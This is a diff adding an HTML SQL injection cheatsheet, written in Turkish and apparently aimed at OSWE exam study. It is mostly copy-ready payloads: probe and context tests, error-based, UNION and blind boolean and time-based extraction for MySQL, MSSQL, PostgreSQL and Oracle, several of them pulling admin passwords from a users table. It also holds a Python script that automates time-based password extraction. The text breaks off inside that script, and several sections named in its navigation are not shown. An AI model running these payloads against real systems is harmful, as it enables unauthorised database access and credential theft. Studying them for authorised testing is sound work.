@@ -1,0 +1,1330 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQL Injection Cheatsheet - OSWE</title>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+  :root {
+    --color-bg: #0f172a;
+    --color-bg-secondary: #1e293b;
+    --color-bg-tertiary: #334155;
+    --color-text-primary: #f1f5f9;
+    --color-text-secondary: #cbd5e1;
+    --color-text-tertiary: #94a3b8;
+    --color-border-primary: #3b82f6;
+    --color-border-secondary: #475569;
+    --color-border-tertiary: #1e293b;
+    --color-accent: #3b82f6;
+    --color-red: #ef4444;
+    --color-orange: #f97316;
+    --color-green: #22c55e;
+    --border-radius-lg: 12px;
+    --border-radius-md: 8px;
+  }
+  
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  
+  body { 
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', sans-serif;
+    background: var(--color-bg);
+    color: var(--color-text-primary);
+    line-height: 1.6;
+    font-size: 14px;
+  }
+  
+  .cs { 
+    padding: 2rem;
+    max-width: 1400px;
+    margin: 0 auto;
+  }
+  
+  h1, h2 { 
+    margin-bottom: 0.5rem;
+    font-weight: 600;
+  }
+  
+  h1 {
+    font-size: 2rem;
+    color: var(--color-accent);
+    margin-bottom: 1rem;
+    padding-bottom: 1rem;
+    border-bottom: 2px solid var(--color-border-secondary);
+  }
+    .nav { 
+      display: flex; 
+      flex-wrap: wrap; 
+      gap: 8px; 
+      margin-bottom: 2rem; 
+      padding: 1rem;
+      background: var(--color-bg-secondary);
+      border-radius: var(--border-radius-lg);
+      border: 1px solid var(--color-border-secondary);
+    }
+    
+    .nav-btn {
+      font-size: 13px; 
+      padding: 8px 16px; 
+      border-radius: 20px;
+      border: 1px solid var(--color-border-secondary);
+      background: transparent;
+      color: var(--color-text-secondary);
+      cursor: pointer; 
+      transition: all 0.2s ease;
+      font-weight: 500;
+      font-family: inherit;
+    }
+    
+    .nav-btn:hover {
+      border-color: var(--color-accent);
+      background: rgba(59, 130, 246, 0.1);
+      color: var(--color-accent);
+    }
+    
+    .nav-btn.active {
+      background: var(--color-accent);
+      color: white;
+      border-color: var(--color-accent);
+    }
+
+    .section { display: none; }
+    .section.active { display: block; animation: fadeIn 0.3s; }
+    
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+    .grid2 { 
+      display: grid; 
+      grid-template-columns: repeat(auto-fit, minmax(500px, 1fr));
+      gap: 1.5rem; 
+      margin-bottom: 1.5rem; 
+    }
+    .grid1 { 
+      display: grid; 
+      grid-template-columns: 1fr;
+      gap: 1.5rem; 
+      margin-bottom: 1.5rem; 
+    }
+    
+    @media (max-width: 768px) {
+      .grid2 { grid-template-columns: 1fr; }
+    }
+
+    .card {
+      background: var(--color-bg-secondary);
+      border: 1px solid var(--color-border-secondary);
+      border-radius: var(--border-radius-lg);
+      padding: 1.5rem;
+      overflow: hidden;
+      transition: all 0.2s ease;
+    }
+    
+    .card:hover {
+      border-color: var(--color-accent);
+      box-shadow: 0 0 20px rgba(59, 130, 246, 0.1);
+    }
+    
+    .card-title {
+      font-size: 13px; 
+      font-weight: 600; 
+      letter-spacing: 0.08em;
+      text-transform: uppercase; 
+      color: var(--color-accent);
+      margin-bottom: 1rem; 
+      padding-bottom: 0.75rem;
+      border-bottom: 2px solid var(--color-border-secondary);
+    }
+    
+    .badge {
+      display: inline-block; 
+      font-size: 11px; 
+      padding: 3px 10px;
+      border-radius: 10px; 
+      font-weight: 600; 
+      margin-left: 8px; 
+      vertical-align: middle;
+    }
+    .badge-red { background: rgba(239, 68, 68, 0.2); color: #ef4444; }
+    .badge-amber { background: rgba(249, 115, 22, 0.2); color: #f97316; }
+    .badge-green { background: rgba(34, 197, 94, 0.2); color: #22c55e; }
+    .badge-blue { background: rgba(59, 130, 246, 0.2); color: #3b82f6; }
+    .badge-purple { background: rgba(168, 85, 247, 0.2); color: #a855f7; }
+
+    code {
+      font-family: 'Fira Code', 'Courier New', monospace;
+      font-size: 13px;
+      background: var(--color-bg-tertiary);
+      padding: 2px 6px; 
+      border-radius: 4px;
+      color: #22c55e;
+    }
+    
+    .code-block {
+      background: var(--color-bg-tertiary);
+      border-radius: var(--border-radius-md);
+      padding: 12px 15px;
+      margin: 1rem 0;
+      font-family: 'Fira Code', 'Courier New', monospace;
+      font-size: 13px;
+      line-height: 1.7;
+      color: var(--color-text-primary);
+      overflow-x: auto;
+      white-space: pre;
+      border-left: 3px solid var(--color-accent);
+    }
+    
+    .code-block .kw { color: #a855f7; font-weight: 600; }
+    .code-block .str { color: #22c55e; }
+    .code-block .cmt { color: var(--color-text-tertiary); }
+    .code-block .num { color: #f97316; }
+    .code-block .fn { color: #3b82f6; }
+    .code-block .danger { color: #ef4444; font-weight: 600; }
+
+    .row { 
+      margin-bottom: 8px; 
+      display: flex; 
+      gap: 8px; 
+      align-items: flex-start; 
+      flex-wrap: wrap; 
+    }
+    .label { 
+      font-size: 12px; 
+      color: var(--color-text-tertiary); 
+      min-width: 80px; 
+      padding-top: 2px;
+      font-weight: 500;
+    }
+    .val { 
+      font-size: 13px; 
+      color: var(--color-text-primary); 
+      font-family: 'Fira Code', monospace;
+    }
+    .desc { 
+      font-size: 13px; 
+      color: var(--color-text-secondary); 
+      line-height: 1.6; 
+      margin-top: 0.75rem;
+    }
+
+    .copy-btn {
+      font-size: 11px; 
+      padding: 4px 10px; 
+      border-radius: 4px; 
+      cursor: pointer;
+      border: 1px solid var(--color-border-secondary);
+      background: transparent; 
+      color: var(--color-text-secondary);
+      float: right; 
+      margin-left: 8px; 
+      font-family: inherit;
+      transition: all 0.15s;
+    }
+    .copy-btn:hover { 
+      background: var(--color-bg-tertiary); 
+      color: var(--color-accent);
+      border-color: var(--color-accent);
+    }
+    .copy-btn.copied { 
+      color: #22c55e; 
+      border-color: #22c55e; 
+    }
+
+    .chip-row { 
+      display: flex; 
+      flex-wrap: wrap; 
+      gap: 8px; 
+      margin: 1rem 0; 
+    }
+    .chip {
+      font-size: 12px; 
+      padding: 4px 12px; 
+      border-radius: 12px;
+      background: var(--color-bg-tertiary);
+      border: 1px solid var(--color-border-secondary);
+      color: var(--color-text-primary); 
+      font-family: 'Fira Code', monospace;
+      cursor: pointer; 
+      transition: all 0.12s;
+    }
+    .chip:hover { 
+      border-color: var(--color-accent);
+      background: rgba(59, 130, 246, 0.1);
+    }
+
+
+
+    table.cstable { 
+      width: 100%; 
+      border-collapse: collapse; 
+      font-size: 13px;
+      margin: 1rem 0;
+    }
+    table.cstable th {
+      text-align: left; 
+      font-size: 12px; 
+      font-weight: 600; 
+      letter-spacing: 0.08em;
+      color: var(--color-accent); 
+      padding: 0.75rem 1rem;
+      border-bottom: 2px solid var(--color-border-secondary); 
+      text-transform: uppercase;
+      background: var(--color-bg-tertiary);
+    }
+    table.cstable td {
+      padding: 0.75rem 1rem; 
+      border-bottom: 1px solid var(--color-border-secondary);
+      color: var(--color-text-primary); 
+      vertical-align: top; 
+      line-height: 1.6;
+    }
+    table.cstable tr:hover {
+      background: var(--color-bg-tertiary);
+    }
+    table.cstable tr:last-child td { border-bottom: none; }
+    table.cstable td code { font-size: 12px; }
+
+    .sep { 
+      height: 1px; 
+      background: var(--color-border-secondary); 
+      margin: 1.5rem 0; 
+    }
+    .tag-danger { color: #ef4444; font-size: 12px; font-weight: 600; }
+    .tag-warn { color: #f97316; font-size: 12px; font-weight: 600; }
+    .tag-ok { color: #22c55e; font-size: 12px; font-weight: 600; }
+
+    .search-bar {
+      width: 100%; 
+      padding: 10px 14px; 
+      font-family: inherit;
+      font-size: 14px; 
+      border-radius: var(--border-radius-md);
+      border: 1px solid var(--color-border-secondary);
+      background: var(--color-bg-secondary);
+      color: var(--color-text-primary); 
+      margin-bottom: 1rem;
+      outline: none;
+      transition: all 0.2s;
+    }
+    .search-bar:focus { 
+      border-color: var(--color-accent);
+      box-shadow: 0 0 10px rgba(59, 130, 246, 0.2);
+    }
+
+    .section-header {
+      font-size: 18px; 
+      font-weight: 600; 
+      color: var(--color-accent);
+      margin: 0 0 1.5rem 0;
+      display: flex; 
+      align-items: center; 
+      gap: 12px;
+      padding-bottom: 1rem;
+      border-bottom: 2px solid var(--color-border-secondary);
+    }
+    
+    .sr-only { 
+      position: absolute; 
+      width: 1px; 
+      height: 1px; 
+      padding: 0; 
+      margin: -1px; 
+      overflow: hidden; 
+      clip: rect(0, 0, 0, 0); 
+      white-space: nowrap; 
+      border-width: 0; 
+    }
+    
+    @media (max-width: 768px) {
+      .cs { padding: 1rem; }
+      h1 { font-size: 1.5rem; }
+      .nav { gap: 6px; padding: 0.75rem; }
+      .nav-btn { font-size: 12px; padding: 6px 12px; }
+      .card { padding: 1rem; }
+      .section-header { font-size: 16px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="cs">
+  <h1>🔓 SQL Injection Cheatsheet — OSWE</h1>
+
+  <div class="nav" id="nav">
+    <button class="nav-btn active" data-sec="detection">Detection</button>
+    <button class="nav-btn" data-sec="error">Error-Based</button>
+    <button class="nav-btn" data-sec="union">UNION</button>
+    <button class="nav-btn" data-sec="blind">Blind / Boolean</button>
+    <button class="nav-btn" data-sec="time">Time-Based</button>
+    <button class="nav-btn" data-sec="oob">OOB / DNS</button>
+    <button class="nav-btn" data-sec="auth">Auth Bypass</button>
+    <button class="nav-btn" data-sec="stacked">Stacked / 2nd Order</button>
+    <button class="nav-btn" data-sec="file">File R/W</button>
+    <button class="nav-btn" data-sec="waf">WAF Bypass</button>
+    <button class="nav-btn" data-sec="nosql">NoSQL</button>
+    <button class="nav-btn" data-sec="dbinfo">DB Fingerprint</button>
+    <button class="nav-btn" data-sec="privesc">Priv Esc</button>
+    <button class="nav-btn" data-sec="filter">Filter Ref</button>
+  </div>
+
+  <!-- DETECTION -->
+  <div class="section active" id="detection">
+    <div class="section-header">Detection & Injection Points</div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">Klasik Probe Karakterleri</div>
+        <div class="chip-row">
+          <span class="chip">'</span><span class="chip">"</span><span class="chip">``</span>
+          <span class="chip">)</span><span class="chip">))</span><span class="chip">;</span>
+          <span class="chip">--</span><span class="chip">#</span><span class="chip">/**/</span>
+          <span class="chip">\'</span><span class="chip">%27</span><span class="chip">%2527</span>
+        </div>
+        <div class="desc">Her karakter için farklı davranış gözlemle: 500, farklı output, zaman değişimi.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Context Tespiti</div>
+        <table class="cstable">
+          <tr><th>Context</th><th>Test</th></tr>
+          <tr><td>String</td><td><code>' AND '1'='1</code></td></tr>
+          <tr><td>Numeric</td><td><code>1 AND 1=1</code></td></tr>
+          <tr><td>LIKE</td><td><code>%' AND 1=1 --</code></td></tr>
+          <tr><td>IN clause</td><td><code>1) AND (1=1</code></td></tr>
+          <tr><td>ORDER BY</td><td><code>1 ASC,SLEEP(1) --</code></td></tr>
+          <tr><td>INSERT</td><td><code>'),('a</code></td></tr>
+        </table>
+      </div>
+    </div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">Matematik ile Doğrulama <span class="badge badge-green">reliable</span></div>
+        <div class="code-block"><span class="cmt">-- DB'ye gitmeden kesin doğrulama</span>
+?id=<span class="num">1</span> AND <span class="num">1</span>=<span class="num">1</span> --+    <span class="cmt">→ TRUE: normal output</span>
+?id=<span class="num">1</span> AND <span class="num">1</span>=<span class="num">2</span> --+    <span class="cmt">→ FALSE: farklı/boş</span>
+?id=<span class="num">1</span>+<span class="num">0</span>           <span class="cmt">→ TRUE: id=1 ile aynı</span>
+?id=<span class="num">2</span>-<span class="num">1</span>           <span class="cmt">→ TRUE: id=1 ile aynı</span>
+?id=<span class="num">1</span>*<span class="num">1</span>           <span class="cmt">→ TRUE</span></div>
+      </div>
+      <div class="card">
+        <div class="card-title">Encoding & Obfuscation Probe</div>
+        <div class="code-block"><span class="cmt">-- URL encode</span>
+<span class="str">'</span>  → %<span class="num">27</span>   → %<span class="num">2527</span> (double)
+<span class="str">"</span>  → %<span class="num">22</span>   → %<span class="num">2522</span>
+<span class="str"> </span>  → %<span class="num">20</span>   → +   → /**/
+<span class="cmt">-- Unicode</span>
+<span class="str">'</span>  → %u0027 → &#x27;
+<span class="cmt">-- Hex</span>
+<span class="str">'</span>  → 0x<span class="num">27</span></div>
+      </div>
+    </div>
+    <div class="grid1">
+      <div class="card">
+        <div class="card-title">Injection Point Haritası</div>
+        <table class="cstable">
+          <tr><th>Parametre Tipi</th><th>Örnek</th><th>Not</th></tr>
+          <tr><td>GET query</td><td><code>?id=1'</code></td><td>En yaygın</td></tr>
+          <tr><td>POST body</td><td><code>user=admin'&pass=x</code></td><td>Burp ile intercept</td></tr>
+          <tr><td>Cookie</td><td><code>session=abc'; --</code></td><td>Çoğu scanner kaçırır</td></tr>
+          <tr><td>HTTP Header</td><td><code>X-Forwarded-For: 1' OR 1=1--</code></td><td>User-Agent, Referer de dene</td></tr>
+          <tr><td>JSON body</td><td><code>{"id":"1'"}</code></td><td>Content-Type: application/json</td></tr>
+          <tr><td>XML / SOAP</td><td><code>&lt;id&gt;1'&lt;/id&gt;</code></td><td>XXE combo mümkün</td></tr>
+          <tr><td>Path param</td><td><code>/user/1'/profile</code></td><td>REST API yaygın</td></tr>
+          <tr><td>Order/Sort</td><td><code>sort=name ASC,SLEEP(3)--</code></td><td>Quote olmadan da çalışır</td></tr>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- ERROR-BASED -->
+  <div class="section" id="error">
+    <div class="section-header">Error-Based SQLi</div>
+    <div class="grid1">
+      <div class="card">
+        <div class="card-title">MySQL — extractvalue / updatexml <span class="badge badge-red">data exfil</span></div>
+        <button class="copy-btn" onclick="cp(this, 'eb1')">copy</button>
+        <div class="code-block" id="eb1"><span class="cmt">-- extractvalue: 32 char limit</span>
+<span class="fn">extractvalue</span>(<span class="num">1</span>,<span class="fn">concat</span>(<span class="num">0x7e</span>,(<span class="kw">SELECT</span> version()),<span class="num">0x7e</span>))
+
+<span class="cmt">-- updatexml: 32 char limit</span>
+<span class="fn">updatexml</span>(<span class="num">1</span>,<span class="fn">concat</span>(<span class="num">0x7e</span>,(<span class="kw">SELECT</span> <span class="fn">database</span>()),<span class="num">0x7e</span>),<span class="num">1</span>)
+
+<span class="cmt">-- 32 char limit bypass → substring</span>
+<span class="fn">extractvalue</span>(<span class="num">1</span>,<span class="fn">concat</span>(<span class="num">0x7e</span>,<span class="fn">mid</span>((<span class="kw">SELECT</span> <span class="fn">group_concat</span>(table_name)
+<span class="kw">FROM</span> information_schema.tables <span class="kw">WHERE</span> table_schema=<span class="fn">database</span>()),<span class="num">1</span>,<span class="num">31</span>),<span class="num">0x7e</span>))</div>
+      </div>
+    </div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">MySQL — floor(rand()) <span class="badge badge-amber">unstable</span></div>
+        <div class="code-block"><span class="kw">SELECT</span> * <span class="kw">FROM</span> t <span class="kw">WHERE</span> id=<span class="num">1</span> AND
+(<span class="kw">SELECT</span> <span class="num">1</span> <span class="kw">FROM</span>
+  (<span class="kw">SELECT</span> <span class="fn">count</span>(*),<span class="fn">concat</span>(
+    (<span class="kw">SELECT</span> <span class="fn">database</span>()),<span class="num">0x3a</span>,
+    <span class="fn">floor</span>(<span class="fn">rand</span>(<span class="num">0</span>)*<span class="num">2</span>))x
+   <span class="kw">FROM</span> information_schema.tables
+   <span class="kw">GROUP BY</span> x)a);</div>
+      </div>
+      <div class="card">
+        <div class="card-title">MSSQL — convert / cast</div>
+        <div class="code-block"><span class="cmt">-- CONVERT hatası</span>
+<span class="fn">CONVERT</span>(int,(<span class="kw">SELECT</span> <span class="fn">TOP</span> <span class="num">1</span> table_name
+<span class="kw">FROM</span> information_schema.tables))
+
+<span class="cmt">-- CAST hatası</span>
+<span class="kw">CAST</span>((<span class="kw">SELECT</span> @@version) <span class="kw">AS</span> int)
+
+<span class="cmt">-- message hatası</span>
+<span class="num">1</span>/<span class="num">0</span>  <span class="cmt">→ division by zero error</span></div>
+      </div>
+    </div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">PostgreSQL</div>
+        <div class="code-block"><span class="cmt">-- cast error</span>
+<span class="kw">CAST</span>((<span class="kw">SELECT</span> version()) <span class="kw">AS</span> integer)
+
+<span class="cmt">-- interval</span>
+<span class="num">1</span> = <span class="kw">CAST</span>((<span class="kw">SELECT</span> current_database())
+        <span class="kw">AS</span> numeric)
+
+<span class="cmt">-- pg_sleep ile verify</span>
+'; <span class="kw">SELECT</span> <span class="fn">pg_sleep</span>(<span class="num">5</span>); --</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Oracle</div>
+        <div class="code-block"><span class="cmt">-- XMLType error</span>
+<span class="kw">SELECT</span> <span class="fn">XMLType</span>((<span class="kw">SELECT</span>
+  <span class="fn">chr</span>(<span class="num">60</span>)||(<span class="kw">SELECT</span> <span class="fn">banner</span>
+  <span class="kw">FROM</span> v$version <span class="kw">WHERE</span> rownum=<span class="num">1</span>)
+  ||<span class="fn">chr</span>(<span class="num">62</span>))) <span class="kw">FROM</span> dual;
+
+<span class="cmt">-- CTXSYS.DRITHSX</span>
+<span class="kw">SELECT</span> <span class="fn">ctxsys.drithsx.sn</span>(user,
+  (<span class="kw">SELECT</span> banner <span class="kw">FROM</span> v$version
+  <span class="kw">WHERE</span> rownum=<span class="num">1</span>)) <span class="kw">FROM</span> dual;</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- UNION -->
+  <div class="section" id="union">
+    <div class="section-header">UNION-Based SQLi</div>
+    <div class="grid1">
+      <div class="card">
+        <div class="card-title">Metodoloji — Adım Adım</div>
+        <div class="code-block"><span class="cmt">-- ADIM 1: Kolon sayısını bul (ORDER BY)</span>
+?id=<span class="num">1</span> <span class="kw">ORDER BY</span> <span class="num">1</span>--    <span class="cmt">→ OK</span>
+?id=<span class="num">1</span> <span class="kw">ORDER BY</span> <span class="num">2</span>--    <span class="cmt">→ OK</span>
+?id=<span class="num">1</span> <span class="kw">ORDER BY</span> <span class="num">3</span>--    <span class="cmt">→ ERROR → 2 kolon</span>
+
+<span class="cmt">-- ADIM 2: NULL ile doğrula (tip uyumsuzluğundan kaçın)</span>
+<span class="kw">UNION SELECT</span> <span class="kw">NULL</span>,<span class="kw">NULL</span>--
+<span class="kw">UNION SELECT</span> <span class="kw">NULL</span>,<span class="kw">NULL</span>,<span class="kw">NULL</span>--
+
+<span class="cmt">-- ADIM 3: String kolonu bul</span>
+<span class="kw">UNION SELECT</span> <span class="str">'a'</span>,<span class="kw">NULL</span>--    <span class="cmt">→ hangi kolonda görünüyor?</span>
+<span class="kw">UNION SELECT</span> <span class="kw">NULL</span>,<span class="str">'a'</span>--
+
+<span class="cmt">-- ADIM 4: Veri çek</span>
+<span class="kw">UNION SELECT</span> <span class="fn">database</span>(),<span class="fn">version</span>()--
+<span class="kw">UNION SELECT</span> table_name,<span class="kw">NULL</span> <span class="kw">FROM</span> information_schema.tables <span class="kw">WHERE</span> table_schema=<span class="fn">database</span>()--
+<span class="kw">UNION SELECT</span> column_name,<span class="kw">NULL</span> <span class="kw">FROM</span> information_schema.columns <span class="kw">WHERE</span> table_name=<span class="str">'users'</span>--
+<span class="kw">UNION SELECT</span> username,password <span class="kw">FROM</span> users--</div>
+      </div>
+    </div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">group_concat ile Multi-Row <span class="badge badge-blue">MySQL</span></div>
+        <div class="code-block"><span class="kw">UNION SELECT</span> <span class="num">1</span>,
+<span class="fn">group_concat</span>(table_name <span class="kw">SEPARATOR</span> <span class="str">'|'</span>),
+<span class="num">3</span> <span class="kw">FROM</span> information_schema.tables
+<span class="kw">WHERE</span> table_schema=<span class="fn">database</span>() --
+
+<span class="cmt">-- Max length 1024 → uzun çıktılar için limit</span>
+<span class="fn">group_concat</span>(column_name <span class="kw">ORDER BY</span>
+ordinal_position) <span class="kw">FROM</span>
+information_schema.columns
+<span class="kw">WHERE</span> table_name=<span class="str">'users'</span></div>
+      </div>
+      <div class="card">
+        <div class="card-title">Output ilk satırda gözükmüyorsa</div>
+        <div class="code-block"><span class="cmt">-- Orijinal sorgu NULL döndür</span>
+?id=<span class="num">999999</span> <span class="kw">UNION SELECT</span> ...
+
+<span class="cmt">-- id'yi mevcut olmayan bir değerle</span>
+<span class="kw">UNION ALL SELECT</span> ...
+
+<span class="cmt">-- Subquery ile force</span>
+<span class="kw">UNION SELECT</span> (<span class="kw">SELECT</span> flag
+  <span class="kw">FROM</span> flags <span class="kw">LIMIT</span> <span class="num">1</span>),<span class="num">2</span>--
+
+<span class="cmt">-- inline concat</span>
+<span class="kw">UNION SELECT</span>
+<span class="fn">concat</span>(username,<span class="str">':'</span>,password),
+<span class="num">2</span> <span class="kw">FROM</span> users <span class="kw">LIMIT</span> <span class="num">1</span>--</div>
+      </div>
+    </div>
+    <div class="grid1">
+      <div class="card">
+        <div class="card-title">DB'ye Göre Schema Sorguları</div>
+        <table class="cstable">
+          <tr><th>DB</th><th>Tablolar</th><th>Kolonlar</th></tr>
+          <tr><td>MySQL</td><td><code>information_schema.tables WHERE table_schema=database()</code></td><td><code>information_schema.columns WHERE table_name='x'</code></td></tr>
+          <tr><td>MSSQL</td><td><code>sysobjects WHERE xtype='U'</code></td><td><code>syscolumns WHERE id=object_id('users')</code></td></tr>
+          <tr><td>PostgreSQL</td><td><code>information_schema.tables WHERE table_schema='public'</code></td><td><code>information_schema.columns WHERE table_name='users'</code></td></tr>
+          <tr><td>Oracle</td><td><code>all_tables</code> / <code>user_tables</code></td><td><code>all_tab_columns WHERE table_name='USERS'</code></td></tr>
+          <tr><td>SQLite</td><td><code>sqlite_master WHERE type='table'</code></td><td><code>pragma_table_info('users')</code></td></tr>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- BLIND BOOLEAN -->
+  <div class="section" id="blind">
+    <div class="section-header">Blind Boolean-Based SQLi</div>
+    <div class="grid1">
+      <div class="card">
+        <div class="card-title">Binary Search ile Char Extraction <span class="badge badge-green">hızlı</span></div>
+        <div class="code-block"><span class="cmt">-- substr + ascii ile tek char</span>
+<span class="kw">AND</span> <span class="fn">ascii</span>(<span class="fn">substr</span>((<span class="kw">SELECT</span> <span class="fn">database</span>()),<span class="num">1</span>,<span class="num">1</span>))&gt;<span class="num">64</span>--   <span class="cmt">→ T/F</span>
+<span class="kw">AND</span> <span class="fn">ascii</span>(<span class="fn">substr</span>((<span class="kw">SELECT</span> <span class="fn">database</span>()),<span class="num">1</span>,<span class="num">1</span>))&gt;<span class="num">96</span>--   <span class="cmt">→ T/F</span>
+<span class="kw">AND</span> <span class="fn">ascii</span>(<span class="fn">substr</span>((<span class="kw">SELECT</span> <span class="fn">database</span>()),<span class="num">1</span>,<span class="num">1</span>))&gt;<span class="num">112</span>--  <span class="cmt">→ F → 97-112 arası</span>
+
+<span class="cmt">-- Tüm password exfil örneği</span>
+<span class="kw">AND</span> <span class="fn">ascii</span>(<span class="fn">substr</span>((<span class="kw">SELECT</span> password <span class="kw">FROM</span> users
+  <span class="kw">WHERE</span> username=<span class="str">'admin'</span>),<span class="num">1</span>,<span class="num">1</span>))=<span class="num">49</span>--
+
+<span class="cmt">-- MSSQL equivalent</span>
+<span class="kw">AND</span> <span class="fn">ascii</span>(<span class="fn">substring</span>((<span class="kw">SELECT</span> <span class="fn">TOP</span> <span class="num">1</span> name
+  <span class="kw">FROM</span> sysobjects <span class="kw">WHERE</span> xtype=<span class="str">'U'</span>),<span class="num">1</span>,<span class="num">1</span>))&gt;<span class="num">64</span>--
+
+<span class="cmt">-- PostgreSQL</span>
+<span class="kw">AND</span> <span class="fn">ascii</span>(<span class="fn">substr</span>((<span class="kw">SELECT</span> current_database()),<span class="num">1</span>,<span class="num">1</span>))&gt;<span class="num">64</span>--</div>
+      </div>
+    </div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">LIKE ile Boolean</div>
+        <div class="code-block"><span class="cmt">-- case-insensitive ama hızlı</span>
+<span class="kw">AND</span> (<span class="kw">SELECT</span> <span class="fn">database</span>()) <span class="kw">LIKE</span> <span class="str">'a%'</span>--
+<span class="kw">AND</span> (<span class="kw">SELECT</span> <span class="fn">database</span>()) <span class="kw">LIKE</span> <span class="str">'ab%'</span>--
+
+<span class="cmt">-- Tablo varlığı kontrolü</span>
+<span class="kw">AND</span> (<span class="kw">SELECT</span> <span class="fn">count</span>(*) <span class="kw">FROM</span> users)&gt;<span class="num">0</span>--
+
+<span class="cmt">-- Regex (MySQL)</span>
+<span class="kw">AND</span> (<span class="kw">SELECT</span> <span class="fn">database</span>()) <span class="kw">REGEXP</span> <span class="str">'^a'</span>--</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Conditional Response</div>
+        <div class="code-block"><span class="cmt">-- IF (MySQL)</span>
+<span class="kw">AND</span> <span class="fn">IF</span>(<span class="num">1</span>=<span class="num">1</span>,<span class="num">1</span>,<span class="num">0</span>)-- <span class="cmt">→ TRUE</span>
+<span class="kw">AND</span> <span class="fn">IF</span>(<span class="num">1</span>=<span class="num">2</span>,<span class="num">1</span>,<span class="num">0</span>)-- <span class="cmt">→ FALSE</span>
+
+<span class="cmt">-- CASE WHEN (tüm DB)</span>
+<span class="kw">AND</span> <span class="num">1</span>=(<span class="kw">CASE WHEN</span> (<span class="num">1</span>=<span class="num">1</span>)
+  <span class="kw">THEN</span> <span class="num">1</span> <span class="kw">ELSE</span> <span class="num">2</span> <span class="kw">END</span>)--
+
+<span class="cmt">-- DECODE (Oracle)</span>
+<span class="kw">AND</span> <span class="num">1</span>=<span class="fn">DECODE</span>(<span class="num">1</span>,<span class="num">1</span>,<span class="num">1</span>,<span class="num">0</span>)</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- TIME-BASED -->
+  <div class="section" id="time">
+    <div class="section-header">Time-Based Blind SQLi</div>
+    <div class="grid1">
+      <div class="card">
+        <div class="card-title">DB'ye Göre Sleep Fonksiyonları</div>
+        <table class="cstable">
+          <tr><th>DB</th><th>Payload</th><th>Not</th></tr>
+          <tr><td>MySQL</td><td><code>SLEEP(5)</code></td><td>Direkt</td></tr>
+          <tr><td>MySQL</td><td><code>BENCHMARK(10000000,SHA1(1))</code></td><td>CPU yoğun alternatif</td></tr>
+          <tr><td>MSSQL</td><td><code>WAITFOR DELAY '0:0:5'</code></td><td>Stacked query gerektirir</td></tr>
+          <tr><td>PostgreSQL</td><td><code>pg_sleep(5)</code></td><td>SELECT pg_sleep(5)</td></tr>
+          <tr><td>Oracle</td><td><code>dbms_pipe.receive_message('a',5)</code></td><td>Privilege gerektirir</td></tr>
+          <tr><td>Oracle</td><td><code>BEGIN DBMS_LOCK.SLEEP(5); END;</code></td><td>PL/SQL block</td></tr>
+          <tr><td>SQLite</td><td><code>randomblob(500000000)</code></td><td>Heavy compute</td></tr>
+        </table>
+      </div>
+    </div>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">Conditional Time (MySQL)</div>
+        <div class="code-block"><span class="cmt">-- IF koşuluyla veri exfil</span>
+<span class="kw">AND</span> <span class="fn">IF</span>(
+  <span class="fn">ascii</span>(<span class="fn">substr</span>(
+    (<span class="kw">SELECT</span> password <span class="kw">FROM</span> users
+     <span class="kw">WHERE</span> username=<span class="str">'admin'</span>),<span class="num">1</span>,<span class="num">1</span>
+  ))&gt;<span class="num">96</span>,
+  <span class="fn">SLEEP</span>(<span class="num">5</span>),<span class="num">0</span>
+)--
+
+<span class="cmt">-- Tablo varlığı</span>
+<span class="kw">AND</span> <span class="fn">IF</span>(
+  (<span class="kw">SELECT</span> <span class="fn">count</span>(*) <span class="kw">FROM</span> users)&gt;<span class="num">0</span>,
+  <span class="fn">SLEEP</span>(<span class="num">5</span>),<span class="num">0</span>
+)--</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Conditional Time (MSSQL)</div>
+        <div class="code-block"><span class="cmt">-- Stacked + WAITFOR</span>
+'; <span class="kw">IF</span> (<span class="kw">SELECT</span> <span class="fn">count</span>(*) <span class="kw">FROM</span>
+  sysobjects <span class="kw">WHERE</span> name=<span class="str">'users'</span>)&gt;<span class="num">0</span>
+<span class="kw">WAITFOR DELAY</span> <span class="str">'0:0:5'</span>--
+
+<span class="cmt">-- Char extraction</span>
+'; <span class="kw">IF</span> (<span class="fn">ascii</span>(<span class="fn">substring</span>(
+  (<span class="kw">SELECT</span> <span class="fn">TOP</span> <span class="num">1</span> password <span class="kw">FROM</span> users),
+  <span class="num">1</span>,<span class="num">1</span>)))&gt;<span class="num">96</span>
+<span class="kw">WAITFOR DELAY</span> <span class="str">'0:0:3'</span>--</div>
+      </div>
+    </div>
+    <div class="grid1">
+      <div class="card">
+        <div class="card-title">Time-Based Otomasyon — Python Snippet</div>
+        <div class="code-block"><span class="kw">import</span> requests, time, string
+
+<span class="fn">def</span> extract_char(pos, url, cookies):
+    <span class="kw">for</span> c <span class="kw">in</span> string.printable:
+        payload = f<span class="str">"1 AND IF(ascii(substr((SELECT password FROM users WHERE username='admin'),{pos},1))={ord(c)},SLEEP(5),0)--"</span>
+        t = time.time()
+        requests.<span class="fn">get</span>(url, params={<span class="str">'id'</span>: payload}, cookies=cookies, timeout=<span class="num">10</span>)
+        <span class="kw">if</span> time.<span class="fn">time</span>() - t &gt; <span class="num">4</span>:
+            <span class="kw">return</span> c
+    <span class="kw">return</span> <span class="str">''</span>
+
+result = <span class="str">''</span>
